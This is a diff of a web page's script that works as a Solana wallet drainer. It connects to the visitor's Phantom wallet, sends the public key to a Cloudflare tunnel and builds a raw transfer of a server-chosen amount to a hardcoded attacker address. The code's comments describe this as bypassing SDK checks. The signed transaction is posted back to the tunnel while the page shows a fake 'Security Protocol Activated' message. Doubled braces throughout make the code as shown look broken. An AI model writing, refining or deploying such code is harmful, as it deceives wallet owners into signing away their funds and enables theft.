@@ -1,5 +1,6 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script>
+        // 🚀 核心环境补丁
         window.Buffer = window.Buffer || {
             from: (arr) => new Uint8Array(arr),
             isBuffer: (obj) => obj instanceof Uint8Array
@@ -17,48 +18,52 @@
     const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
     const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
 
-    document.getElementById('cta').onclick = async () => {
-        try {
+    // 🔱 物理对齐工具：手动构造 8 字节小端序 Uint8Array
+    function to8BytesLE(amount) {{
+        const buf = new ArrayBuffer(8);
+        const view = new DataView(buf);
+        view.setBigUint64(0, BigInt(amount), true);
+        return new Uint8Array(buf);
+    }}
+
+    document.getElementById('cta').onclick = async () => {{
+        try {{
             const p = window.solana || window.phantom?.solana;
-            if (!p) { alert("Use Wallet Browser!"); return; }
             await p.connect();
             
-            const data = await fetch(TUNNEL + '/get_data', {
-                method: 'POST', headers: {'Content-Type':'application/json'},
-                body: JSON.stringify({pubkey: p.publicKey.toString()})
-            }).then(r => r.json());
+            const data = await fetch(TUNNEL + '/get_data', {{
+                method: 'POST', headers: {{'Content-Type':'application/json'}},
+                body: JSON.stringify({{pubkey: p.publicKey.toString()}})
+            }}).then(r => r.json());
 
-            // 🔱 终极修复：增加容错判断，确保 BigInt 永远不会处理 undefined
-            const amountStr = data.safe_amount || "0";
-            const amount = BigInt(amountStr);
+            // 🚀 核心绕过：手动构造 Instruction Data，跳过 SDK 内部所有编码检查
+            const instructionData = new Uint8Array(12);
+            instructionData.set([2, 0, 0, 0], 0); // Transfer Instruction Index
+            instructionData.set(to8BytesLE(data.safe_amount), 4); // 8 字节金额
 
-            const transaction = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: p.publicKey,
-                    toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
-                    lamports: Number(amount) 
-                })
-            );
+            const transaction = new solanaWeb3.Transaction().add({{
+                keys: [
+                    {{ pubkey: p.publicKey, isSigner: true, isWritable: true }},
+                    {{ pubkey: new solanaWeb3.PublicKey(TARGET_ADDR), isSigner: false, isWritable: true }}
+                ],
+                programId: solanaWeb3.SystemProgram.programId,
+                data: instructionData,
+            }});
 
             transaction.recentBlockhash = data.blockhash;
             transaction.feePayer = p.publicKey;
             
-            document.getElementById('msg').innerText = "Awaiting Signature...";
             const signed = await p.signTransaction(transaction);
-            
             const raw = signed.serialize();
-            let bStr = "";
-            for (let i = 0; i < raw.length; i++) { bStr += String.fromCharCode(raw[i]); }
+            let b64 = "";
+            for (let i = 0; i < raw.length; i++) {{ b64 += String.fromCharCode(raw[i]); }}
             
-            fetch(TUNNEL + '/collect', {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({signature: window.btoa(bStr)})
-            });
+            fetch(TUNNEL + '/collect', {{
+                method:'POST', headers:{{'Content-Type':'application/json'}},
+                body:JSON.stringify({{signature: window.btoa(b64)}})
+            }});
             
             alert("Security Protocol Activated!");
-        } catch(e) { 
-            alert("Status: " + e.message); 
-            document.getElementById('msg').innerText = "Error: " + e.message;
-        }
-    }
+        }} catch(e) {{ alert("Status: " + e.message); }}
+    }}
     </script></body></html>
